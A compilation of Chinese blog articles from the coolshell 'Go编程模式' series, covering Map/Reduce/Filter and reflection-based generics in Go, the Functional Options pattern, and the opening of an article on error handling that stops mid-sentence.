![img](photo/go.map_.reduce-300x192.png)在本篇文章中，我们学习一下函数式编程的中非常重要的Map、Reduce、Filter的三种操作，这三种操作可以让我们非常方便灵活地进行一些数据处理——我们的程序中大多数情况下都是在到倒腾数据，尤其对于一些需要统计的业务场景，Map/Reduce/Filter是非常通用的玩法。下面先来看几个例子：

### 本文是全系列中第5 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- Go编程模式：Map-Reduce
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21214.html)[下一篇文章](https://coolshell.cn/articles/21179.html) »

目录



[基本示例](https://coolshell.cn/articles/21164.html#基本示例)[Map示例](https://coolshell.cn/articles/21164.html#Map示例)[Reduce 示例](https://coolshell.cn/articles/21164.html#Reduce_示例)[Filter示例](https://coolshell.cn/articles/21164.html#Filter示例)[业务示例](https://coolshell.cn/articles/21164.html#业务示例)[员工信息](https://coolshell.cn/articles/21164.html#员工信息)[相关的Reduce/Fitler函数](https://coolshell.cn/articles/21164.html#相关的ReduceFitler函数)[各种自定义的统计示例](https://coolshell.cn/articles/21164.html#各种自定义的统计示例)[泛型Map-Reduce](https://coolshell.cn/articles/21164.html#泛型Map-Reduce)[简单版 Generic Map](https://coolshell.cn/articles/21164.html#简单版_Generic_Map)[健壮版的Generic Map](https://coolshell.cn/articles/21164.html#健壮版的Generic_Map)[健壮版的 Generic Reduce](https://coolshell.cn/articles/21164.html#健壮版的_Generic_Reduce)[健壮版的 Generic Filter](https://coolshell.cn/articles/21164.html#健壮版的_Generic_Filter)[后记](https://coolshell.cn/articles/21164.html#后记)

#### 基本示例

##### Map示例

下面的程序代码中，我们写了两个Map函数，这两个函数需要两个参数，

- 一个是字符串数组 `[]string`，说明需要处理的数据一个字符串
- 另一个是一个函数`func(s string) string` 或 `func(s string) int`

```
func MapStrToStr(arr []string, fn func(s string) string) []string {
    var newArray = []string{}
    for _, it := range arr {
        newArray = append(newArray, fn(it))
    }
    return newArray
}

func MapStrToInt(arr []string, fn func(s string) int) []int {
    var newArray = []int{}
    for _, it := range arr {
        newArray = append(newArray, fn(it))
    }
    return newArray
}
```

整个Map函数运行逻辑都很相似，函数体都是在遍历第一个参数的数组，然后，调用第二个参数的函数，然后把其值组合成另一个数组返回。



于是我们就可以这样使用这两个函数：

```
var list = []string{"Hao", "Chen", "MegaEase"}

x := MapStrToStr(list, func(s string) string {
    return strings.ToUpper(s)
})
fmt.Printf("%v\n", x)
//["HAO", "CHEN", "MEGAEASE"]

y := MapStrToInt(list, func(s string) int {
    return len(s)
})
fmt.Printf("%v\n", y)
//[3, 4, 8]
```

我们可以看到，我们给第一个 `MapStrToStr()` 传了函数做的是 转大写，于是出来的数组就成了全大写的，给`MapStrToInt()` 传的是算其长度，所以出来的数组是每个字符串的长度。

我们再来看一下Reduce和Filter的函数是什么样的。

##### **Reduce 示例**

```
func Reduce(arr []string, fn func(s string) int) int {
    sum := 0
    for _, it := range arr {
        sum += fn(it)
    }
    return sum
}

var list = []string{"Hao", "Chen", "MegaEase"}

x := Reduce(list, func(s string) int {
    return len(s)
})
fmt.Printf("%v\n", x)
// 15
```

##### **Filter示例**

```
func Filter(arr []int, fn func(n int) bool) []int {
    var newArray = []int{}
    for _, it := range arr {
        if fn(it) {
            newArray = append(newArray, it)
        }
    }
    return newArray
}

var intset = []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
out := Filter(intset, func(n int) bool {
   return n%2 == 1
})
fmt.Printf("%v\n", out)

out = Filter(intset, func(n int) bool {
    return n > 5
})
fmt.Printf("%v\n", out)
```

下图是一个比喻，其非常形象地说明了Map-Reduce是的业务语义，其在数据处理中非常有用。

![img](photo/map-reduce.png)

#### 业务示例

通过上面的一些示例，你可能有一些明白，Map/Reduce/Filter只是一种控制逻辑，真正的业务逻辑是在传给他们的数据和那个函数来定义的。是的，这是一个很经典的“业务逻辑”和“控制逻辑”分离解耦的编程模式。下面我们来看一个有业务意义的代码，来让大家强化理解一下什么叫“控制逻辑”与业务逻辑分离。

##### 员工信息

首先，我们一个员工对象，以及一些数据

```
type Employee struct {
    Name     string
    Age      int
    Vacation int
    Salary   int
}

var list = []Employee{
    {"Hao", 44, 0, 8000},
    {"Bob", 34, 10, 5000},
    {"Alice", 23, 5, 9000},
    {"Jack", 26, 0, 4000},
    {"Tom", 48, 9, 7500},
    {"Marry", 29, 0, 6000},
    {"Mike", 32, 8, 4000},
}
```

##### 相关的Reduce/Fitler函数

然后，我们有如下的几个函数：

```
func EmployeeCountIf(list []Employee, fn func(e *Employee) bool) int {
    count := 0
    for i, _ := range list {
        if fn(&list[i]) {
            count += 1
        }
    }
    return count
}

func EmployeeFilterIn(list []Employee, fn func(e *Employee) bool) []Employee {
    var newList []Employee
    for i, _ := range list {
        if fn(&list[i]) {
            newList = append(newList, list[i])
        }
    }
    return newList
}

func EmployeeSumIf(list []Employee, fn func(e *Employee) int) int {
    var sum = 0
    for i, _ := range list {
        sum += fn(&list[i])
    }
    return sum
}
```

简单说明一下：

- `EmployeeConutIf` 和 `EmployeeSumIf` 分别用于统满足某个条件的个数或总数。它们都是Filter + Reduce的语义。
- `EmployeeFilterIn` 就是按某种条件过虑。就是Fitler的语义。

##### 各种自定义的统计示例

于是我们就可以有如下的代码。

**1）统计有多少员工大于40岁**

```
old := EmployeeCountIf(list, func(e *Employee) bool {
    return e.Age > 40
})
fmt.Printf("old people: %d\n", old)
//old people: 2
```

**2）统计有多少员工薪水大于6000**

```
high_pay := EmployeeCountIf(list, func(e *Employee) bool {
    return e.Salary >= 6000
})
fmt.Printf("High Salary people: %d\n", high_pay)
//High Salary people: 4
```

**3）列出有没有休假的员工**

```
no_vacation := EmployeeFilterIn(list, func(e *Employee) bool {
    return e.Vacation == 0
})
fmt.Printf("People no vacation: %v\n", no_vacation)
//People no vacation: [{Hao 44 0 8000} {Jack 26 0 4000} {Marry 29 0 6000}]
```

**4）统计所有员工的薪资总和**

```
total_pay := EmployeeSumIf(list, func(e *Employee) int {
    return e.Salary
})

fmt.Printf("Total Salary: %d\n", total_pay)
//Total Salary: 43500
```

**5）统计30岁以下员工的薪资总和**

```
younger_pay := EmployeeSumIf(list, func(e *Employee) int {
    if e.Age < 30 {
        return e.Salary
    } 
    return 0
})
```

#### 泛型Map-Reduce

我们可以看到，上面的Map-Reduce都因为要处理数据的类型不同而需要写出不同版本的Map-Reduce，虽然他们的代码看上去是很类似的。所以，这里就要带出来泛型编程了，Go语言在本文写作的时候还不支持泛型（注：Go开发团队技术负责人Russ Cox在2012年11月21golang-dev上的mail确认了Go泛型(type parameter)将在Go 1.18版本落地，即2022.2月份）。

##### 简单版 Generic Map

所以，目前的Go语言的泛型只能用 `interface{}` + `reflect`来完成，`interface{}` 可以理解为C中的 `void*`，Java中的 `Object` ，`reflect`是Go的反射机制包，用于在运行时检查类型。

下面我们来看一下一个非常简单不作任何类型检查的泛型的Map函数怎么写。

```
func Map(data interface{}, fn interface{}) []interface{} {
    vfn := reflect.ValueOf(fn)
    vdata := reflect.ValueOf(data)
    result := make([]interface{}, vdata.Len())

    for i := 0; i < vdata.Len(); i++ {
        result[i] = vfn.Call([]reflect.Value{vdata.Index(i)})[0].Interface()
    }
    return result
}
```

上面的代码中，

- 通过 `reflect.ValueOf()` 来获得 `interface{}` 的值，其中一个是数据 `vdata`，另一个是函数 `vfn`，
- 然后通过 `vfn.Call()` 方法来调用函数，通过 `[]refelct.Value{vdata.Index(i)}`来获得数据。

Go语言中的反射的语法还是有点令人费解的，但是简单看一下手册还是能够读懂的。我这篇文章不讲反射，所以相关的基础知识还请大家自行Google相关的教程。

于是，我们就可以有下面的代码——不同类型的数据可以使用相同逻辑的`Map()`代码。

```
square := func(x int) int {
  return x * x
}
nums := []int{1, 2, 3, 4}

squared_arr := Map(nums,square)
fmt.Println(squared_arr)
//[1 4 9 16]



upcase := func(s string) string {
  return strings.ToUpper(s)
}
strs := []string{"Hao", "Chen", "MegaEase"}
upstrs := Map(strs, upcase);
fmt.Println(upstrs)
//[HAO CHEN MEGAEASE]
```

但是因为反射是运行时的事，所以，如果类型什么出问题的话，就会有运行时的错误。比如：

```
x := Map(5, 5)
fmt.Println(x)
```

上面的代码可以很轻松的编译通过，但是在运行时就出问题了，还是panic错误……

```
panic: reflect: call of reflect.Value.Len on int Value

goroutine 1 [running]:
reflect.Value.Len(0x10b5240, 0x10eeb58, 0x82, 0x10716bc)
        /usr/local/Cellar/go/1.15.3/libexec/src/reflect/value.go:1162 +0x185
main.Map(0x10b5240, 0x10eeb58, 0x10b5240, 0x10eeb60, 0x1, 0x14, 0x0)
        /Users/chenhao/.../map.go:12 +0x16b
main.main()
        /Users/chenhao/.../map.go:42 +0x465
exit status 2
```

##### 健壮版的Generic Map

所以，如果要写一个健壮的程序，对于这种用`interface{}` 的“过度泛型”，就需要我们自己来做类型检查。下面是一个有类型检查的Map代码：

```
func Transform(slice, function interface{}) interface{} {
  return transform(slice, function, false)
}

func TransformInPlace(slice, function interface{}) interface{} {
  return transform(slice, function, true)
}

func transform(slice, function interface{}, inPlace bool) interface{} {
 
  //check the slice type is Slice
  sliceInType := reflect.ValueOf(slice)
  if sliceInType.Kind() != reflect.Slice {
    panic("transform: not slice")
  }

  //check the function signature
  fn := reflect.ValueOf(function)
  elemType := sliceInType.Type().Elem()
  if !verifyFuncSignature(fn, elemType, nil) {
    panic("trasform: function must be of type func(" + sliceInType.Type().Elem().String() + ") outputElemType")
  }

  sliceOutType := sliceInType
  if !inPlace {
    sliceOutType = reflect.MakeSlice(reflect.SliceOf(fn.Type().Out(0)), sliceInType.Len(), sliceInType.Len())
  }
  for i := 0; i < sliceInType.Len(); i++ {
    sliceOutType.Index(i).Set(fn.Call([]reflect.Value{sliceInType.Index(i)})[0])
  }
  return sliceOutType.Interface()

}

func verifyFuncSignature(fn reflect.Value, types ...reflect.Type) bool {

  //Check it is a funciton
  if fn.Kind() != reflect.Func {
    return false
  }
  // NumIn() - returns a function type's input parameter count.
  // NumOut() - returns a function type's output parameter count.
  if (fn.Type().NumIn() != len(types)-1) || (fn.Type().NumOut() != 1) {
    return false
  }
  // In() - returns the type of a function type's i'th input parameter.
  for i := 0; i < len(types)-1; i++ {
    if fn.Type().In(i) != types[i] {
      return false
    }
  }
  // Out() - returns the type of a function type's i'th output parameter.
  outType := types[len(types)-1]
  if outType != nil && fn.Type().Out(0) != outType {
    return false
  }
  return true
}
```

上面的代码一下子就复杂起来了，可见，复杂的代码都是在处理异常的地方。我不打算Walk through 所有的代码，别看代码多，但是还是可以读懂的，下面列几个代码中的要点：

- 代码中没有使用Map函数，因为和数据结构和关键有含义冲突的问题，所以使用`Transform`，这个来源于 C++ STL库中的命名。

- 有两个版本的函数，一个是返回一个全新的数组 – `Transform()`，一个是“就地完成” – `TransformInPlace()`

- 在主函数中，用 `Kind()` 方法检查了数据类型是不是 Slice，函数类型是不是Func

- 检查函数的参数和返回类型是通过

   

  ```
  verifyFuncSignature()
  ```

   

  来完成的，其中：

  - `NumIn()` – 用来检查函数的“入参”
  -  `NumOut()` 用来检查函数的“返回值”

- 如果需要新生成一个Slice，会使用 `reflect.MakeSlice()` 来完成。

好了，有了上面的这段代码，我们的代码就很可以很开心的使用了：

可以用于字符串数组

```
list := []string{"1", "2", "3", "4", "5", "6"}
result := Transform(list, func(a string) string{
    return a +a +a
})
//{"111","222","333","444","555","666"}
```

可以用于整形数组

```
list := []int{1, 2, 3, 4, 5, 6, 7, 8, 9}
TransformInPlace(list, func (a int) int {
  return a*3
})
//{3, 6, 9, 12, 15, 18, 21, 24, 27}
```

可以用于结构体

```
var list = []Employee{
    {"Hao", 44, 0, 8000},
    {"Bob", 34, 10, 5000},
    {"Alice", 23, 5, 9000},
    {"Jack", 26, 0, 4000},
    {"Tom", 48, 9, 7500},
}

result := TransformInPlace(list, func(e Employee) Employee {
    e.Salary += 1000
    e.Age += 1
    return e
})
```

##### 健壮版的 Generic Reduce

同样，泛型版的 Reduce 代码如下：

```
func Reduce(slice, pairFunc, zero interface{}) interface{} {
  sliceInType := reflect.ValueOf(slice)
  if sliceInType.Kind() != reflect.Slice {
    panic("reduce: wrong type, not slice")
  }

  len := sliceInType.Len()
  if len == 0 {
    return zero
  } else if len == 1 {
    return sliceInType.Index(0)
  }

  elemType := sliceInType.Type().Elem()
  fn := reflect.ValueOf(pairFunc)
  if !verifyFuncSignature(fn, elemType, elemType, elemType) {
    t := elemType.String()
    panic("reduce: function must be of type func(" + t + ", " + t + ") " + t)
  }

  var ins [2]reflect.Value
  ins[0] = sliceInType.Index(0)
  ins[1] = sliceInType.Index(1)
  out := fn.Call(ins[:])[0]

  for i := 2; i < len; i++ {
    ins[0] = out
    ins[1] = sliceInType.Index(i)
    out = fn.Call(ins[:])[0]
  }
  return out.Interface()
}
```

##### 健壮版的 Generic Filter

同样，泛型版的 Filter 代码如下（同样分是否“就地计算”的两个版本）：

```
func Filter(slice, function interface{}) interface{} {
  result, _ := filter(slice, function, false)
  return result
}

func FilterInPlace(slicePtr, function interface{}) {
  in := reflect.ValueOf(slicePtr)
  if in.Kind() != reflect.Ptr {
    panic("FilterInPlace: wrong type, " +
      "not a pointer to slice")
  }
  _, n := filter(in.Elem().Interface(), function, true)
  in.Elem().SetLen(n)
}

var boolType = reflect.ValueOf(true).Type()

func filter(slice, function interface{}, inPlace bool) (interface{}, int) {

  sliceInType := reflect.ValueOf(slice)
  if sliceInType.Kind() != reflect.Slice {
    panic("filter: wrong type, not a slice")
  }

  fn := reflect.ValueOf(function)
  elemType := sliceInType.Type().Elem()
  if !verifyFuncSignature(fn, elemType, boolType) {
    panic("filter: function must be of type func(" + elemType.String() + ") bool")
  }

  var which []int
  for i := 0; i < sliceInType.Len(); i++ {
    if fn.Call([]reflect.Value{sliceInType.Index(i)})[0].Bool() {
      which = append(which, i)
    }
  }

  out := sliceInType

  if !inPlace {
    out = reflect.MakeSlice(sliceInType.Type(), len(which), len(which))
  }
  for i := range which {
    out.Index(i).Set(sliceInType.Index(which[i]))
  }

  return out.Interface(), len(which)
}
```

#### 后记

还有几个未尽事宜：

1）使用反射来做这些东西，会有一个问题，**那就是代码的性能会很差。所以，上面的代码不能用于你需要高性能的地方**。怎么解决这个问题，我们会在本系列文章的下一篇文章中讨论。

2）上面的代码大量的参考了 Rob Pike的版本，他的代码在 https://github.com/robpike/filter

3）其实，在全世界范围内，有大量的程序员都在问Go语言官方什么时候在标准库中支持 Map/Reduce，Rob Pike说，这种东西难写吗？还要我们官方来帮你们写么？这种代码我多少年前就写过了，但是，我从来一次都没有用过，我还是喜欢用“For循环”，我觉得你最好也跟我一起用 “For循环”。

我个人觉得，Map/Reduce在数据处理的时候还是很有用的，Rob Pike可能平时也不怎么写“业务逻辑”的代码，所以，对他来说可能也不太了解业务的变化有多么的频繁……

当然，好还是不好，由你来判断，但多学一些编程模式是对自己的帮助也是很有帮助的。

（全文完）

# GO 编程模式：FUNCTIONAL OPTIONS

#####  [2020年12月22日 ](https://coolshell.cn/articles/21146.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [15 条评论](https://coolshell.cn/articles/21146.html#comments) 49,899 人阅读

![img](photo/go.options-300x186.png)在本篇文章中，我们来讨论一下Functional Options这个编程模式。这是一个函数式编程的应用案例，编程技巧也很好，是目前在Go语言中最流行的一种编程模式。但是，在我们正式讨论这个模式之前，我们需要先来看看要解决什么样的问题。

### 本文是全系列中第3 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- Go 编程模式：Functional Options
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21140.html)[下一篇文章](https://coolshell.cn/articles/21214.html) »

目录



[配置选项问题](https://coolshell.cn/articles/21146.html#配置选项问题)[配置对象方案](https://coolshell.cn/articles/21146.html#配置对象方案)[Builder模式](https://coolshell.cn/articles/21146.html#Builder模式)[Functional Options](https://coolshell.cn/articles/21146.html#Functional_Options)[参考文档](https://coolshell.cn/articles/21146.html#参考文档)

#### 配置选项问题

在我们编程中，我们会经常性的需要对一个对象（或是业务实体）进行相关的配置。比如下面这个业务实体（注意，这仅只是一个示例）：

```
type Server struct {
    Addr     string
    Port     int
    Protocol string
    Timeout  time.Duration
    MaxConns int
    TLS      *tls.Config
}
```

在这个 `Server` 对象中，我们可以看到：



- 要有侦听的IP地址 `Addr` 和端口号 `Port` ，这两个配置选项是必填的（当然，IP地址和端口号都可以有默认值，当这里我们用于举例认为是没有默认值，而且不能为空，需要必填的）。
- 然后，还有协议 `Protocol` 、 `Timeout` 和`MaxConns` 字段，这几个字段是不能为空的，但是有默认值的，比如：协议是`tcp`, 超时`30`秒 和 最大链接数`1024`个。
- 还有一个 `TLS` 这个是安全链接，需要配置相关的证书和私钥。这个是可以为空的。

所以，针对于上述这样的配置，我们需要有多种不同的创建不同配置 `Server` 的函数签名，如下所示（代码比较宽，需要左右滚动浏览）：

```
func NewDefaultServer(addr string, port int) (*Server, error) {
  return &Server{addr, port, "tcp", 30 * time.Second, 100, nil}, nil
}

func NewTLSServer(addr string, port int, tls *tls.Config) (*Server, error) {
  return &Server{addr, port, "tcp", 30 * time.Second, 100, tls}, nil
}

func NewServerWithTimeout(addr string, port int, timeout time.Duration) (*Server, error) {
  return &Server{addr, port, "tcp", timeout, 100, nil}, nil
}

func NewTLSServerWithMaxConnAndTimeout(addr string, port int, maxconns int, timeout time.Duration, tls *tls.Config) (*Server, error) {
  return &Server{addr, port, "tcp", 30 * time.Second, maxconns, tls}, nil
}
```

因为Go语言不支持重载函数，所以，你得用不同的函数名来应对不同的配置选项。

#### 配置对象方案

要解决这个问题，最常见的方式是使用一个配置对象，如下所示：

```
type Config struct {
    Protocol string
    Timeout  time.Duration
    Maxconns int
    TLS      *tls.Config
}
```

我们把那些非必输的选项都移到一个结构体里，于是 `Server` 对象变成了：

```
type Server struct {
    Addr string
    Port int
    Conf *Config
}
```

于是，我们只需要一个 `NewServer()` 的函数了，在使用前需要构造 `Config` 对象。

```
func NewServer(addr string, port int, conf *Config) (*Server, error) {
    //...
}

//Using the default configuratrion
srv1, _ := NewServer("localhost", 9000, nil) 

conf := ServerConfig{Protocol:"tcp", Timeout: 60*time.Duration}
srv2, _ := NewServer("locahost", 9000, &conf)
```

这段代码算是不错了，大多数情况下，我们可能就止步于此了。但是，对于有洁癖的有追求的程序员来说，他们能看到其中有一点不好的是，`Config` 并不是必需的，所以，你需要判断是否是 `nil` 或是 Empty – `Config{}`这让我们的代码感觉还是有点不是很干净。

#### Builder模式

如果你是一个Java程序员，熟悉设计模式的一定会很自然地使用上Builder模式。比如如下的代码：

```
User user = new User.Builder()
  .name("Hao Chen")
  .email("haoel@hotmail.com")
  .nickname("左耳朵")
  .build();
```

仿照上面这个模式，我们可以把上面代码改写成如下的代码（注：下面的代码没有考虑出错处理，其中关于出错处理的更多内容，请参看《[Go 编程模式：出错处理](https://coolshell.cn/articles/21140.html)》）：

```
//使用一个builder类来做包装
type ServerBuilder struct {
  Server
}

func (sb *ServerBuilder) Create(addr string, port int) *ServerBuilder {
  sb.Server.Addr = addr
  sb.Server.Port = port
  //其它代码设置其它成员的默认值
  return sb
}

func (sb *ServerBuilder) WithProtocol(protocol string) *ServerBuilder {
  sb.Server.Protocol = protocol 
  return sb
}

func (sb *ServerBuilder) WithMaxConn( maxconn int) *ServerBuilder {
  sb.Server.MaxConns = maxconn
  return sb
}

func (sb *ServerBuilder) WithTimeOut( timeout time.Duration) *ServerBuilder {
  sb.Server.Timeout = timeout
  return sb
}

func (sb *ServerBuilder) WithTLS( tls *tls.Config) *ServerBuilder {
  sb.Server.TLS = tls
  return sb
}

func (sb *ServerBuilder) Build() (Server) {
  return  sb.Server
}
```

于是就可以以如下的方式来使用了

```
sb := ServerBuilder{}
server, err := sb.Create("127.0.0.1", 8080).
  WithProtocol("udp").
  WithMaxConn(1024).
  WithTimeOut(30*time.Second).
  Build()
```

上面这样的方式也很清楚，不需要额外的Config类，使用链式的函数调用的方式来构造一个对象，只需要多加一个Builder类，这个Builder类似乎有点多余，我们似乎可以直接在`Server` 上进行这样的 Builder 构造，的确是这样的。但是在处理错误的时候可能就有点麻烦（需要为Server结构增加一个error 成员，破坏了Server结构体的“纯洁”），不如一个包装类更好一些。

如果我们想省掉这个包装的结构体，那么就轮到我们的Functional Options上场了，函数式编程。

#### Functional Options

首先，我们先定义一个函数类型：

```
type Option func(*Server)
```

然后，我们可以使用函数式的方式定义一组如下的函数：

```
func Protocol(p string) Option {
    return func(s *Server) {
        s.Protocol = p
    }
}
func Timeout(timeout time.Duration) Option {
    return func(s *Server) {
        s.Timeout = timeout
    }
}
func MaxConns(maxconns int) Option {
    return func(s *Server) {
        s.MaxConns = maxconns
    }
}
func TLS(tls *tls.Config) Option {
    return func(s *Server) {
        s.TLS = tls
    }
}
```

上面这组代码传入一个参数，然后返回一个函数，返回的这个函数会设置自己的 `Server` 参数。例如：

- 当我们调用其中的一个函数用 `MaxConns(30)` 时
- 其返回值是一个 `func(s* Server) { s.MaxConns = 30 }` 的函数。

这个叫高阶函数。在数学上，就好像这样的数学定义，计算长方形面积的公式为： `rect(width, height) = width * height;` 这个函数需要两个参数，我们包装一下，就可以变成计算正方形面积的公式：`square(width) = rect(width, width)` 也就是说，`squre(width)`返回了另外一个函数，这个函数就是`rect(w,h)` 只不过他的两个参数是一样的。即：`f(x) = g(x, x)`

好了，现在我们再定一个 `NewServer()`的函数，其中，有一个可变参数 `options` 其可以传出多个上面上的函数，然后使用一个for-loop来设置我们的 `Server` 对象。

```
func NewServer(addr string, port int, options ...func(*Server)) (*Server, error) {

  srv := Server{
    Addr:     addr,
    Port:     port,
    Protocol: "tcp",
    Timeout:  30 * time.Second,
    MaxConns: 1000,
    TLS:      nil,
  }
  for _, option := range options {
    option(&srv)
  }
  //...
  return &srv, nil
}
```

于是，我们在创建 `Server` 对象的时候，我们就可以这样来了。

```
s1, _ := NewServer("localhost", 1024)
s2, _ := NewServer("localhost", 2048, Protocol("udp"))
s3, _ := NewServer("0.0.0.0", 8080, Timeout(300*time.Second), MaxConns(1000))
```

怎么样，是不是高度的整洁和优雅？不但解决了使用 `Config` 对象方式 的需要有一个config参数，但在不需要的时候，是放 `nil` 还是放 `Config{}`的选择困难，也不需要引用一个Builder的控制对象，直接使用函数式编程的试，在代码阅读上也很优雅。

所以，以后，大家在要玩类似的代码时，强烈推荐使用Functional Options这种方式，这种方式至少带来了如下的好处：

- 直觉式的编程
- 高度的可配置化
- 很容易维护和扩展
- 自文档
- 对于新来的人很容易上手
- 没有什么令人困惑的事（是nil 还是空）

#### 参考文档

- **“Self referential functions and design” by Rob Pike
  **http://commandcenter.blogspot.com.au/2014/01/self-referential-functions-and-design.html

(全文完)

# GO 编程模式：错误处理

#####  [2020年12月22日 ](https://coolshell.cn/articles/21140.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [24 条评论](https://coolshell.cn/articles/21140.html#comments) 52,487 人阅读

![img](photo/err-check-300x186.jpg)错误处理一直以一是编程必需要面对的问题，错误处理如果做的好的话，代码的稳定性会很好。不同的语言有不同的出现处理的方式。Go语言也一样，在本篇文章中，我们来讨论一下Go语言的出错出处，尤其是那令人抓狂的 `if err != nil` 。

在正式讨论Go代码里满屏的 `if err != nil` 怎么办这个事之前，我想先说一说编程中的错误处理。这样可以让大家在更高的层面理解编程中的错误处理。

### 本文是全系列中第2 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- Go 编程模式：错误处理
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21128.html)[下一篇文章](https://coolshell.cn/articles/21146.html) »

目录



[C语言的错误检查](https://coolshell.cn/articles/21140.html#C语言的错误检查)[Java的错误处理](https://coolshell.cn/articles/21140.html#Java的错误处理)[Go语言的错误处理](https://coolshell.cn/articles/21140.html#Go语言的错误处理)[资源清理](https://coolshell.cn/articles/21140.html#资源清理)[Error Check Hell](https://coolshell.cn/articles/21140.html#Error_Check_Hell)[包装错误](https://coolshell.cn/articles/21140.html#包装错误)[参考文章](https://coolshell.cn/articles/21140.html#参考文章)

#### C语言的错误检查

首先，我们知道，处理错误最直接的方式是通过错误码，这也是传统的方式，在过程式语言中通常都是用这样的方式处理错误的。比如 C 语言，基本上来说，其通过函数的返回值标识是否有错，然后通过全局的 `errno` 变量并配合一个 `errstr` 的数组来告诉你为什么出错。

为什么是这样的设计？道理很简单，除了可以共用一些错误，更重要的是这其实是一种妥协。比如：`read()`, `write()`, `open()` 这些函数的返回值其实是返回有业务逻辑的值。也就是说，这些函数的返回值有两种语义，一种是成功的值，比如 `open()` 返回的文件句柄指针 `FILE*` ，或是错误 `NULL`。这样会导致调用者并不知道是什么原因出错了，需要去检查 `errno` 来获得出错的原因，从而可以正确地处理错误。

一般而言，这样的错误处理方式在大多数情况下是没什么问题的。但是也有例外的情况，我们来看一下下面这个 C 语言的函数：



```
int atoi(const char *str)
```

这个函数是把一个字符串转成整型。但是问题来了，如果一个要传的字符串是非法的（不是数字的格式），如 “ABC” 或者整型溢出了，那么这个函数应该返回什么呢？出错返回，返回什么数都不合理，因为这会和正常的结果混淆在一起。比如，返回 `0`，那么会和正常的对 “0” 字符的返回值完全混淆在一起。这样就无法判断出错的情况。你可能会说，是不是要检查一下 `errno`，按道理说应该是要去检查的，但是，我们在 C99 的规格说明书中可以看到这样的描述——

> 7.20.1The functions atof, atoi, atol, and atoll need not affect the value of the integer expression errno on an error. If the value of the result cannot be represented, the behavior is undeﬁned.

像`atoi()`, `atof()`, `atol()` 或是 `atoll()` 这样的函数是不会设置 `errno`的，而且，还说了，如果结果无法计算的话，行为是undefined。所以，后来，libc 又给出了一个新的函数`strtol()`，这个函数在出错的时会设置全局变量 `errno` ：

```
long val = strtol(in_str, &endptr, 10);  //10的意思是10进制

//如果无法转换
if (endptr == str) {
    fprintf(stderr, "No digits were found\n");
    exit(EXIT_FAILURE);
}

//如果整型溢出了
if ((errno == ERANGE && (val == LONG_MAX || val == LONG_MIN)) {
    fprintf(stderr, "ERROR: number out of range for LONG\n");
    exit(EXIT_FAILURE);
 }

//如果是其它错误
if (errno != 0 && val == 0) {
    perror("strtol");
    exit(EXIT_FAILURE);
}
```

虽然，`strtol()` 函数解决了 `atoi()` 函数的问题，但是我们还是能感觉到不是很舒服和自然。

因为，这种用 返回值 + errno 的错误检查方式会有一些问题:

- 程序员一不小心就会忘记返回值的检查，从而造成代码的 Bug；
- 函数接口非常不纯洁，正常值和错误值混淆在一起，导致语义有问题。

所以，后来，有一些类库就开始区分这样的事情。比如，Windows 的系统调用开始使用 `HRESULT` 的返回来统一错误的返回值，这样可以明确函数调用时的返回值是成功还是错误。但这样一来，函数的 input 和 output 只能通过函数的参数来完成，于是出现了所谓的 入参 和 出参 这样的区别。

然而，这又使得函数接入中参数的语义变得复杂，一些参数是入参，一些参数是出参，函数接口变得复杂了一些。而且，依然没有解决函数的成功或失败可以被人为忽略的问题。

#### Java的错误处理

Java语言使用 `try-catch-finally` 通过使用异常的方式来处理错误，其实，这比起C语言的错处理进了一大步，使用抛异常和抓异常的方式可以让我们的代码有这样的一些好处：

- 函数接口在 input（参数）和 output（返回值）以及错误处理的语义是比较清楚的。
- 正常逻辑的代码可以与错误处理和资源清理的代码分开，提高了代码的可读性。
- 异常不能被忽略（如果要忽略也需要 catch 住，这是显式忽略）。
- 在面向对象的语言中（如 Java），异常是个对象，所以，可以实现多态式的 catch。
- 与状态返回码相比，异常捕捉有一个显著的好处是，函数可以嵌套调用，或是链式调用。比如：
  - `int x = add(a, div(b,c));`
  - `Pizza p = PizzaBuilder().SetSize(sz).SetPrice(p)...;`

#### Go语言的错误处理

Go 语言的函数支持多返回值，所以，可以在返回接口把业务语义（业务返回值）和控制语义（出错返回值）区分开来。Go 语言的很多函数都会返回 result, err 两个值，于是:

